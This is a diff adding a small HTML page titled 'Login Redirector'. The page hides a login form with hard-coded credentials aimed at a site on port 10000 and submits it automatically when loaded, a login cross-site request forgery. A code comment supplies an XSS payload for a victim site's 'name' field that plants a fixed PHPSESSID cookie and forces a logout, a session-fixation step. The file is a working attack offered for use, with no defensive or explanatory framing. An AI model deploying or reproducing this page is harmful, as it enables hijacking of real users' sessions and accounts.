@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Redirector</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .login-form {
+            display: none; /* Hide the form */
+        }
+    </style>
+</head>
+<body>
+    <h1>Login to xPossible</h1>
+    
+    <!-- Method 1: Form submission -->
+    <div class="login-form">
+        <h2>Method 1: Direct Form Submission</h2>
+        <form id="loginForm" action="http://mysite.com:10000/index.php" method="POST">
+            <input type="text" name="username" placeholder="Username" value="user" required>
+            <input type="password" name="password" placeholder="Password" value="pass" required>
+            <input type="hidden" name="login" value="1">
+            <button type="submit">Login</button>
+        </form>
+    </div>
+
+    <script>
+        // Automatically submit the form when page loads
+        window.onload = function() {
+            document.getElementById('loginForm').submit();
+        };
+        // this is the xss payload that should be in your `name` in victim site
+        //"<script>document.cookie="PHPSESSID=7dfd308acefd139c2e834742b2a1fc67; path=/;";window.location='?logout';</script>"
+    </script>
+</body>
+</html>
